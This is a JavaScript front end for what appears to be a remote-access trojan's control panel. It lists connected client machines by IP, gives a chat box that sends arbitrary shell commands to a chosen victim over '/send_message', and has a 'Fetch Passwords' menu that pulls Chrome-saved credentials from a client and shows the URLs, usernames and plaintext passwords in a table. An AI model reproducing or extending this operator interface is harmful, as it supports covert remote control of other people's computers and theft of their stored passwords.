let chatVisible = false;
let selectedClient = null;





async function displayClients() {
  const response = await fetch('/listShellConnections', {
    method: 'GET'
  });
  const clients = await response.json();
  const clientsContainer = document.getElementById('clients-container');

  for (let ip in clients) {
    console.log(ip);
    const clientDiv = document.createElement('div');
    clientDiv.className = 'client';


    const optionBar = document.createElement('i');
    optionBar.className = "fa-solid fa-ellipsis-vertical"
    clientDiv.appendChild(optionBar)
    optionBar.addEventListener("click",() => DisplaySettings(clientDiv,ip))

    const clientIcon = document.createElement('i');
    clientIcon.className = 'fa-brands fa-windows';
    clientIcon.style.color = '#49da3e';
    clientIcon.addEventListener('click', () => onClientClick(ip, clientIcon));
    clientDiv.appendChild(clientIcon);

    const clientIp = document.createElement('div');
    clientIp.className = 'client-ip';
    clientIp.textContent = ip;
    clientDiv.appendChild(clientIp);

    clientsContainer.appendChild(clientDiv);
  }

 
  function onClientClick(ip, clientIcon) {
    const icons = clientsContainer.querySelectorAll('.client img');
    icons.forEach(icon => {
      icon.classList.remove('selected');
    });

    if (selectedClient !== ip) {
      clientIcon.classList.add('selected');
      handleChat(ip);
      chatVisible = true;
    } else {
      toggleChatVisibility();
    }

    selectedClient = chatVisible ? ip : null;
  }
}


function toggleChatVisibility() {
  const containerChat = document.getElementById('ChatContainer');
  chatVisible = !chatVisible;
  containerChat.style.display = chatVisible ? 'block' : 'none';
}

function handleChat(hostname) {
  const buttonSend = document.getElementById('sentButton')
  const containerChat = document.getElementById('ChatContainer');
  containerChat.style.display = 'block'
  const chatBody = document.querySelector('.chat-body');
  const txtInput = document.getElementById('txtInput');
  const chatHeader = document.querySelector('.chat-header');
  chatHeader.innerHTML = "";
  const ipElement = document.createElement('div');
  ipElement.className = 'title';
  ipElement.textContent = `Client IP: ${hostname}`;
  chatHeader.appendChild(ipElement);


  txtInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter" && !event.shiftKey) {
      event.preventDefault();
      renderUserMessage();
    } else if (event.key === "Enter" && event.shiftKey) {
      event.preventDefault();
      const cursorPosition = txtInput.selectionStart;
      txtInput.value = txtInput.value.slice(0, cursorPosition) + "\n" + txtInput.value.slice(cursorPosition);
      txtInput.selectionEnd = cursorPosition + 1;

      resizeInput();

    }
  });

  buttonSend.addEventListener("click", () => {
      renderUserMessage();
  });

  txtInput.addEventListener("input", () => {
    resizeInput();
  });

  function resizeInput() {
    const previousHeight = txtInput.style.height ? parseInt(txtInput.style.height.slice(0, -2)) : 0;
  
    const rowsLen = Math.max(txtInput.value.split('\n').length, 1);
    if (rowsLen > 2) {
      txtInput.rows = rowsLen;
    }
    const newHeight = parseInt(txtInput.style.height.slice(0, -2));
    const bottomAdjustment = newHeight - previousHeight;
    txtInput.style.bottom = (parseInt(txtInput.style.bottom.slice(0, -2)) - bottomAdjustment) + "px";
    txtInput.scrollTop = txtInput.scrollHeight;
  }
  

  const renderUserMessage = () => {  
    const userInput = txtInput.value
    renderMessageEle(userInput, "user");
    txtInput.value = "";
    renderChatbotResponse(userInput);
  };

  const renderChatbotResponse = async (userInput) => {
    try {
      const response = await fetch("/send_message", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({message:{command: userInput}, ip: hostname})
      });

      const data = await response.json();
      const chatbotResponse = data.message;
      renderMessageEle(chatbotResponse);
    } catch (error) {
      console.error("Error:", error);
    }
  };

  const renderMessageEle = (txt, type) => {
    let className = "user-message";
    if (type !== "user") {
      className = "chatbot-message";
    }
    const messageEle = document.createElement("div");
    const txtNode = document.createTextNode(txt);
    messageEle.classList.add(className);
    messageEle.append(txtNode);
    chatBody.append(messageEle);
    setScrollPosition();
  };

  const setScrollPosition = () => {
    if (chatBody.scrollHeight > 0) {
      chatBody.scrollTop = chatBody.scrollHeight;
    }
  };
}

function PasswordOption(e, hostname){
  e.preventDefault();
  toggleAll("");
  fetch('/passwordsTableIndex')
    .then(response => response.text())
    .then(html => {
      const modal = document.createElement('div');
      modal.innerHTML = html;
      modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
      modal.id = "PasswordMainTable"
      document.body.appendChild(modal);
      
      FetchPasswords(hostname).then(data => {
        console.log(data);
        let profileSelection = document.querySelector('#profile-selection');
        for(let profile in data){
            console.log(profile);
            let option = document.createElement('option');
            option.text = profile;
            option.value = profile;
            profileSelection.add(option);
        }

        profileSelection.addEventListener('change', function() {
          let selectedProfile = this.value;
          let profileData = data[selectedProfile];
          let tbody = document.querySelector('#profileTable tbody');
          while (tbody.firstChild) {
              tbody.removeChild(tbody.firstChild);
          }
          profileData.forEach(function(record) {
            if (record.password.length > 0 || record.user.length > 0){
                tbody.insertAdjacentHTML('beforeend', `<tr>
                    <td class="url">${record.url}</td>
                    <td class="created">${record.created}</td>
                    <td class="last">${record.last}</td>
                    <td class="user">${record.user}</td>
                    <td class="password">${record.password}</td>
                    </tr>`
                );
            }
          });
        });

        profileSelection.dispatchEvent(new Event('change'));
      });
    })
    .catch(error => console.error('Error:', error));
}


function DisplaySettings(clientDiv,hostname){
  let menu = document.getElementById('settings-menu');

  if (!menu) {
    menu = document.createElement('div');
    menu.id = "settings-menu";
    menu.style.display = "none"; 

    const ul = document.createElement('ul');
    const li = document.createElement('li');
    li.style = "padding: 3px;";
    ul.style = "margin-bottom: 0px;";

    const passwords = document.createElement('a');
    passwords.href = "#";
    passwords.textContent = "Fetch Passwords";
    passwords.style = "padding: 5px 5px 5px 5px;";
    passwords.addEventListener('click', (e) => PasswordOption(e, hostname));
    li.appendChild(passwords);

    ul.appendChild(li);
    menu.appendChild(ul);
    clientDiv.appendChild(menu);
  }

  if (menu.style.display === 'none') {
    menu.style.display = 'block';
  } else {
    menu.style.display = 'none';
  }
}


function FetchPasswords(hostname){
  return fetch("/send_message", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({message:{command: "5df297c2f2da83a8b45cfd012fbf9b3c",type:"Passwords",web:"chrome"}, ip: hostname})
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(res => {
    console.log(res);
    return res.message;
  })
  .catch(error => {
    console.error('An error occurred while fetching passwords:', error);
  });
}



function toggleAll(exclude){
  const array = ["ChatContainer","settings-menu"];
  array.forEach(element => {
    if (element != exclude){
      let el = document.getElementById(element);
      if(el) {
        el.style.display = 'none';
      }
    }
  });
}



displayClients()